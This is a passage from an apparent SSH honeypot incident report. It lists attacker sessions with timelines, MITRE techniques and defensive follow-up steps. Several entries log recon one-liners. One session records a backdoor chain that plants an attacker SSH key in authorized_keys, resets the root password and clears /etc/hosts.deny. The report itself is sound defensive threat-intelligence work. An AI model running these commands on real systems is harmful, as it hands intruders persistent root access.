| `2026-07-09 12:15:32` | `cowrie.session.connect` |
| `2026-07-09 12:15:33` | `cowrie.client.version` |
| `2026-07-09 12:15:33` | `cowrie.client.kex` |
| `2026-07-09 12:15:36` | `cowrie.login.success` |
| `2026-07-09 12:15:39` | `cowrie.session.params` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.success` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:39` | `cowrie.command.input` |
| `2026-07-09 12:15:40` | `cowrie.log.closed` |
| `2026-07-09 12:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186b10d6d416

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-07-09 12:16 |
| **Last Seen** | 2026-07-09 12:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:16:19` | `cowrie.session.connect` |
| `2026-07-09 12:16:20` | `cowrie.client.version` |
| `2026-07-09 12:16:20` | `cowrie.client.kex` |
| `2026-07-09 12:16:23` | `cowrie.login.success` |
| `2026-07-09 12:16:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4084ab9e73d2

| Field | Detail |
|---|---|
| **Source IP** | `164.92.228[.]62` |
| **First Seen** | 2026-07-09 12:17 |
| **Last Seen** | 2026-07-09 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:17:42` | `cowrie.session.connect` |
| `2026-07-09 12:17:42` | `cowrie.client.version` |
| `2026-07-09 12:17:42` | `cowrie.client.kex` |
| `2026-07-09 12:17:42` | `cowrie.login.success` |
| `2026-07-09 12:17:43` | `cowrie.session.params` |
| `2026-07-09 12:17:43` | `cowrie.command.input` |
| `2026-07-09 12:17:43` | `cowrie.log.closed` |
| `2026-07-09 12:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.228[.]62` to AbuseIPDB if not already reported
- [ ] Block `164.92.228[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c01508b0c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:17 |
| **Last Seen** | 2026-07-09 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:17:48` | `cowrie.session.connect` |
| `2026-07-09 12:17:49` | `cowrie.client.version` |
| `2026-07-09 12:17:49` | `cowrie.client.kex` |
| `2026-07-09 12:17:52` | `cowrie.login.success` |
| `2026-07-09 12:17:54` | `cowrie.session.params` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.success` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:54` | `cowrie.command.input` |
| `2026-07-09 12:17:55` | `cowrie.log.closed` |
| `2026-07-09 12:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ade292a1fd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:20 |
| **Last Seen** | 2026-07-09 12:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:20:05` | `cowrie.session.connect` |
| `2026-07-09 12:20:06` | `cowrie.client.version` |
| `2026-07-09 12:20:06` | `cowrie.client.kex` |
| `2026-07-09 12:20:09` | `cowrie.login.success` |
| `2026-07-09 12:20:12` | `cowrie.session.params` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.success` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.command.input` |
| `2026-07-09 12:20:12` | `cowrie.log.closed` |
| `2026-07-09 12:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629b5ec6960a

| Field | Detail |
|---|---|
| **Source IP** | `164.92.228[.]62` |
| **First Seen** | 2026-07-09 12:20 |
| **Last Seen** | 2026-07-09 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:20:13` | `cowrie.session.connect` |
| `2026-07-09 12:20:13` | `cowrie.client.version` |
| `2026-07-09 12:20:13` | `cowrie.client.kex` |
| `2026-07-09 12:20:13` | `cowrie.login.success` |
| `2026-07-09 12:20:14` | `cowrie.session.params` |
| `2026-07-09 12:20:14` | `cowrie.command.input` |
| `2026-07-09 12:20:14` | `cowrie.log.closed` |
| `2026-07-09 12:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.228[.]62` to AbuseIPDB if not already reported
- [ ] Block `164.92.228[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9062490d1a40

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 12:20 |
| **Last Seen** | 2026-07-09 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:20:46` | `cowrie.session.connect` |
| `2026-07-09 12:20:46` | `cowrie.client.version` |
| `2026-07-09 12:20:46` | `cowrie.client.kex` |
| `2026-07-09 12:20:46` | `cowrie.login.success` |
| `2026-07-09 12:20:47` | `cowrie.session.params` |
| `2026-07-09 12:20:47` | `cowrie.command.input` |
| `2026-07-09 12:20:47` | `cowrie.log.closed` |
| `2026-07-09 12:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d9d54f651c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 12:20 |
| **Last Seen** | 2026-07-09 12:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:20:56` | `cowrie.session.connect` |
| `2026-07-09 12:20:56` | `cowrie.client.version` |
| `2026-07-09 12:20:56` | `cowrie.client.kex` |
| `2026-07-09 12:20:57` | `cowrie.login.success` |
| `2026-07-09 12:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5ffb84d50a6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 12:20 |
| **Last Seen** | 2026-07-09 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:20:56` | `cowrie.session.connect` |
| `2026-07-09 12:20:56` | `cowrie.client.version` |
| `2026-07-09 12:20:56` | `cowrie.client.kex` |
| `2026-07-09 12:20:57` | `cowrie.login.success` |
| `2026-07-09 12:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891e7df4c47c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 12:21 |
| **Last Seen** | 2026-07-09 12:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:21:00` | `cowrie.session.connect` |
| `2026-07-09 12:21:00` | `cowrie.client.version` |
| `2026-07-09 12:21:00` | `cowrie.client.kex` |
| `2026-07-09 12:21:01` | `cowrie.login.success` |
| `2026-07-09 12:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517f765875c8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 12:21 |
| **Last Seen** | 2026-07-09 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:21:01` | `cowrie.session.connect` |
| `2026-07-09 12:21:01` | `cowrie.client.version` |
| `2026-07-09 12:21:01` | `cowrie.client.kex` |
| `2026-07-09 12:21:02` | `cowrie.login.success` |
| `2026-07-09 12:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68fa93161d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:22 |
| **Last Seen** | 2026-07-09 12:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:22:21` | `cowrie.session.connect` |
| `2026-07-09 12:22:22` | `cowrie.client.version` |
| `2026-07-09 12:22:22` | `cowrie.client.kex` |
| `2026-07-09 12:22:26` | `cowrie.login.success` |
| `2026-07-09 12:22:28` | `cowrie.session.params` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.success` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:28` | `cowrie.command.input` |
| `2026-07-09 12:22:29` | `cowrie.log.closed` |
| `2026-07-09 12:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7628f6a0b0fb

| Field | Detail |
|---|---|
| **Source IP** | `206.167.33[.]157` |
| **First Seen** | 2026-07-09 12:24 |
| **Last Seen** | 2026-07-09 12:25 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9rqSflbmBBw7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:24:09` | `cowrie.session.connect` |
| `2026-07-09 12:24:09` | `cowrie.client.version` |
| `2026-07-09 12:24:09` | `cowrie.client.kex` |
| `2026-07-09 12:24:10` | `cowrie.login.success` |
| `2026-07-09 12:24:11` | `cowrie.session.params` |
| `2026-07-09 12:24:11` | `cowrie.command.input` |
| `2026-07-09 12:24:11` | `cowrie.command.failed` |
| `2026-07-09 12:24:12` | `cowrie.log.closed` |
| `2026-07-09 12:24:13` | `cowrie.session.params` |
| `2026-07-09 12:24:13` | `cowrie.command.input` |
| `2026-07-09 12:24:13` | `cowrie.session.file_download` |
| `2026-07-09 12:24:13` | `cowrie.log.closed` |
| `2026-07-09 12:24:42` | `cowrie.session.params` |
| `2026-07-09 12:24:42` | `cowrie.command.input` |
| `2026-07-09 12:24:42` | `cowrie.log.closed` |
| `2026-07-09 12:24:43` | `cowrie.session.params` |
| `2026-07-09 12:24:43` | `cowrie.command.input` |
| `2026-07-09 12:24:44` | `cowrie.log.closed` |
| `2026-07-09 12:24:45` | `cowrie.session.params` |
| `2026-07-09 12:24:45` | `cowrie.command.input` |
| `2026-07-09 12:24:45` | `cowrie.session.file_download` |
| `2026-07-09 12:24:45` | `cowrie.log.closed` |
| `2026-07-09 12:24:46` | `cowrie.session.params` |
| `2026-07-09 12:24:46` | `cowrie.command.input` |
| `2026-07-09 12:24:47` | `cowrie.log.closed` |
| `2026-07-09 12:24:48` | `cowrie.session.params` |
| `2026-07-09 12:24:48` | `cowrie.command.input` |
| `2026-07-09 12:24:48` | `cowrie.log.closed` |
| `2026-07-09 12:24:49` | `cowrie.session.params` |
| `2026-07-09 12:24:49` | `cowrie.command.input` |
| `2026-07-09 12:24:49` | `cowrie.command.input` |
| `2026-07-09 12:24:50` | `cowrie.log.closed` |
| `2026-07-09 12:24:50` | `cowrie.session.params` |
| `2026-07-09 12:24:50` | `cowrie.command.input` |
| `2026-07-09 12:24:51` | `cowrie.log.closed` |
| `2026-07-09 12:24:52` | `cowrie.session.params` |
| `2026-07-09 12:24:52` | `cowrie.command.input` |
| `2026-07-09 12:24:52` | `cowrie.log.closed` |
| `2026-07-09 12:24:53` | `cowrie.session.params` |
| `2026-07-09 12:24:53` | `cowrie.command.input` |
| `2026-07-09 12:24:54` | `cowrie.log.closed` |
| `2026-07-09 12:24:55` | `cowrie.session.params` |
| `2026-07-09 12:24:55` | `cowrie.command.input` |
| `2026-07-09 12:24:55` | `cowrie.log.closed` |
| `2026-07-09 12:24:56` | `cowrie.session.params` |
| `2026-07-09 12:24:56` | `cowrie.command.input` |
| `2026-07-09 12:24:56` | `cowrie.log.closed` |
| `2026-07-09 12:24:57` | `cowrie.session.params` |
| `2026-07-09 12:24:57` | `cowrie.command.input` |
| `2026-07-09 12:24:58` | `cowrie.log.closed` |
| `2026-07-09 12:24:58` | `cowrie.session.params` |
| `2026-07-09 12:24:58` | `cowrie.command.input` |
| `2026-07-09 12:24:59` | `cowrie.log.closed` |
| `2026-07-09 12:25:00` | `cowrie.session.params` |
| `2026-07-09 12:25:00` | `cowrie.command.input` |
| `2026-07-09 12:25:01` | `cowrie.log.closed` |
| `2026-07-09 12:25:02` | `cowrie.session.params` |
| `2026-07-09 12:25:02` | `cowrie.command.input` |
| `2026-07-09 12:25:02` | `cowrie.log.closed` |
| `2026-07-09 12:25:03` | `cowrie.session.params` |
| `2026-07-09 12:25:03` | `cowrie.command.input` |
| `2026-07-09 12:25:03` | `cowrie.log.closed` |
| `2026-07-09 12:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.167.33[.]157` to AbuseIPDB if not already reported
- [ ] Block `206.167.33[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa81ccbc808

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:26 |
| **Last Seen** | 2026-07-09 12:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:26:54` | `cowrie.session.connect` |
| `2026-07-09 12:26:55` | `cowrie.client.version` |
| `2026-07-09 12:26:55` | `cowrie.client.kex` |
| `2026-07-09 12:26:58` | `cowrie.login.success` |
| `2026-07-09 12:26:59` | `cowrie.session.params` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.success` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:26:59` | `cowrie.command.input` |
| `2026-07-09 12:27:00` | `cowrie.log.closed` |
| `2026-07-09 12:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5a4706be83

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:29 |
| **Last Seen** | 2026-07-09 12:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:29:04` | `cowrie.session.connect` |
| `2026-07-09 12:29:04` | `cowrie.client.version` |
| `2026-07-09 12:29:04` | `cowrie.client.kex` |
| `2026-07-09 12:29:07` | `cowrie.login.success` |
| `2026-07-09 12:29:09` | `cowrie.session.params` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.success` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:09` | `cowrie.command.input` |
| `2026-07-09 12:29:10` | `cowrie.log.closed` |
| `2026-07-09 12:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdfd77e59dab

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 12:29 |
| **Last Seen** | 2026-07-09 12:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:29:20` | `cowrie.session.connect` |
| `2026-07-09 12:29:21` | `cowrie.client.version` |
| `2026-07-09 12:29:21` | `cowrie.client.kex` |
| `2026-07-09 12:29:27` | `cowrie.login.success` |
| `2026-07-09 12:29:30` | `cowrie.session.params` |
| `2026-07-09 12:29:30` | `cowrie.command.input` |
| `2026-07-09 12:29:31` | `cowrie.log.closed` |
| `2026-07-09 12:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-605241804bfc

| Field | Detail |
|---|---|
| **Source IP** | `106.89.59[.]26` |
| **First Seen** | 2026-07-09 12:31 |
| **Last Seen** | 2026-07-09 12:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:31:01` | `cowrie.session.connect` |
| `2026-07-09 12:31:02` | `cowrie.client.version` |
| `2026-07-09 12:31:02` | `cowrie.client.kex` |
| `2026-07-09 12:31:05` | `cowrie.login.success` |
| `2026-07-09 12:31:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.59[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.89.59[.]26` at perimeter firewall / security group
